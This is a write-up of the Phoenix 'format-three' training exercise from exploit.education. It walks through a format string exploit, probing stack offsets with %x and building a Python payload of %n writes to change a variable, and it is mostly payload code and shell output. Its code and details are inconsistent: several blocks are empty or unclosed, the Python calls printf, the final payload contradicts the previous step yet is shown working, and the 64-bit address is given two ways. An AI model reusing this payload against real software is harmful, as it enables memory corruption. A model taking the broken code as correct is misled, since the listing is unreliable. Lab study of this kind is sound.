## Quick Overview

Similar to [Format Two Writeup](https://shivasurya.me/security/binary-exploit/reverse-engineering/friday-gems/2023/03/31/exploit-education-format-one-exercise-writeup.html), Format Three exercise motives are smashing the stack, overwrite arbitrary memory address or variable. However, this Format Three challenge revolves around [`Format String Vulnerability`](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) and quit challenging when exploiting in 64-bit architecture binary.

## Disassemble

Disassembling the code will get you overall idea behind the format-two code, One can use `gdb ./format-three` to start debugging it in runtime.

1. `gdb ./format-three`
2. Type `disassemble main` to get the disassembled code (assembly)

```assembly

```

Before taking a look at the code, if you disassembled the format-two using gdb to view the assembly instruction, you may notice the puts, fgets, sprintf function calls with parameters. So basically when you hit `r` in gdb without breakpoint,

1. Greet with `Welcome to phoenix/format-three, brought to you by https://exploit.education` message via Puts (aka printf) method
2. The main function starts by declaring a character buffer of size 4096 and printing the welcome message. It then reads input from the standard input stream into the buffer. If the read is unsuccessful, the program exits with a failure status.
3. Next, the program calls the bounce function, which takes a character pointer as an argument and prints the string pointed to by that pointer using the printf function.
4. After calling the bounce function, the program checks if the value of the changeme variable is equal to `0x64457845`. If it is, the program prints a success message. Otherwise, it prints a failure message that includes the current value of the changeme variable.

## Memory Allocation - Exploit Strategy

 If you take closer look at the memory allocation, `changeme` variable it's placed on the stack before `buffer` char array. There is no way you could overflow buffer overflow variable and overwrite `changeme` variable. However, introducing `%n` format modifier string can perform this magic by overwriting the address using `format string vulnerability`. 

 Our first step is to print "AAAA" temporarily and find the padding where it gets stored in the stack memory. We can start our exploration with couple of %x which helps in printing the address of the stack,
 
```shell
user@phoenix-amd64:/opt/phoenix/i486$ echo -e 'AAAA%x.%x.%x.%x.%x.\n' | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA0.0.0.f7f81cf7.f7ffb000.

Better luck next time - got 0x00000000, wanted 0x64457845!
```
Our experiment continues untill we find `AAAA` or 41414141 in the stack and eventually we come to know that it occurs at the 11th padding,

```shell
user@phoenix-amd64:/opt/phoenix/i486$ echo -e 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n' | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA0.0.0.f7f81cf7.f7ffb000.ffffd718.8048556.ffffc710.ffffc710.fff.0.41414141

Better luck next time - got 0x00000000, wanted 0x64457845!
```

Now that we found the padding, it's time to find the exact memory address of `changeme` variable. For 64-bit binary `format-three` it should be `0x600a90` and 32-bit binary should be `0x8049844`. While performing the exploit, I personally found 64-bit arch challenging due to few reasons discussed in the next section.

So, let's come up with a payload for 32-bit arch format-three binary first. Since, `changeme` now requires to be `0x64457845` which is pretty huge number and I don't think we have enough bytes to overwrite the memory address. However, there is a workaround by spliting the address into 4 bytes (32 Bit platform) and each byte gets a specific number of junk bytes to overwrite. For example, `\x44\x98\x04\x08` can try writing `45` first and carry forward to next bytes if any overflow.

One can start overwriting single byte with trial and error method, starting `changeme+0` with padding 11 yields

```python
changeme = 0x8049844

buff = ""
buff += p32(changeme+0) 
buff += p32(changeme+1) 
buff += p32(changeme+2) 
buff += p32(changeme+3) 

buff += '%x ' * 11      # offset to first byte
buff += "%n"

print(buff)
```

```shell
user@phoenix-amd64:/opt/phoenix/i486$ python $HOME/format-three.py | /opt/phoenix/i486/format-three

```

1. When `changeme+0` is getting overwritten as `0x00000051` but our target was `0x00000045` matching `0x64457845`. We could try pushing few more junk characters and bump `51` to `145`. So, we now require `0x145` - `0x51` i.e in decimal 244 characters to be written.

```python
changeme = 0x8049844

buff = ""
buff += p32(changeme+0) 
buff += p32(changeme+1) 
buff += p32(changeme+2) 
buff += p32(changeme+3) 

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 244       # JUNK
buff += "%n"   

print(buff)
```

```shell

2. When `changeme+1` is getting overwritten as `0x00000145` but our target was `0x00007845` matching `0x64457845`. We could try pushing few more junk characters and bump `145` to `178`. So, we now require `0x178` - `0x145` i.e in decimal 51 characters to be written.

```python
changeme = 0x8049844

buff = ""
buff += p32(changeme+0) 
buff += p32(changeme+1) 
buff += p32(changeme+2) 
buff += p32(changeme+3) 

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 244       # JUNK
buff += "%n"            # write to first byte

buff += 'A' * 51        # JUNK
buff += "%n"            # write to second byte
printf(buff)
```


```shell

3. When `changeme+2` is getting overwritten as `0x00000178` but our target was `0x00457845` matching `0x64457845`. We could try pushing few more junk characters and bump `178` to `245`. So, we now require `0x245` - `0x178` i.e in decimal 205 characters to be written.

```python
changeme = 0x8049844

buff = ""
buff += p32(changeme+0) 
buff += p32(changeme+1) 
buff += p32(changeme+2) 
buff += p32(changeme+3) 

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 244       # JUNK
buff += "%n"            # write to first byte

buff += 'A' * 51        # JUNK
buff += "%n"            # write to second byte

buff += 'A' * 205        # JUNK
buff += "%n"            # write to second byte

printf(buff)
```


```shell

```

4. When `changeme+3` is getting overwritten as `0x00000245` but our target was `0x64457845` matching `0x64457845`. We could try pushing few more junk characters and bump `245` to `264`. So, we now require `0x264` - `0x245` i.e in decimal 31 characters to be written.

```python
changeme = 0x8049844

buff = ""
buff += p32(changeme+0) 
buff += p32(changeme+1) 
buff += p32(changeme+2) 
buff += p32(changeme+3) 

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 244       
buff += "%n"            # write to first byte

buff += 'A' * 51        
buff += "%n"            # write to second byte

buff += 'A' * 31        
buff += "%n"            # write to third byte

printf(buff)
```

```shell
user@phoenix-amd64:/opt/phoenix/i486$ python $HOME/format-three.py | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
D�E�F�G�0 0 0 f7f81cf7 f7ffb000 ffffd718 8048556 ffffc710 ffffc710 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

So, you might be wondering where is that carry over `2` from `264` 🤣 - Consider it as inflation and cost-of-living.


## Challenge faced while exploiting 64-bit binary

As mentioned above while going through memory address of `changeme` variable in the stack of 64-bit binary should be `0x600af0` and it contains unreasonable characters 😥 - `\x00` and  `\0a` null character & new line terminator which is interpreted by the `strncpy` function and completely terminates the argument while copying to the buffer.

However, there might be better strategy to overcome this issue by altering environment variables that may push the address or placing the address to the end of the string in payload.

## Exploit

Now, our strategy should be,

1. Input `format string` as above python file execution results pipe-ing to `format-three` binary 
2. Now, `printf` overwrites the `changeme` using random address from stack.

```shell
user@phoenix-amd64:/opt/phoenix/i486$ python $HOME/format-three.py | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
D�E�F�G�0 0 0 f7f81cf7 f7ffb000 ffffd718 8048556 ffffc710 ffffc710 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

There you go! 🎉 You've officially `pwned` and you may eventually gain code execution in upcoming exercises 🪲
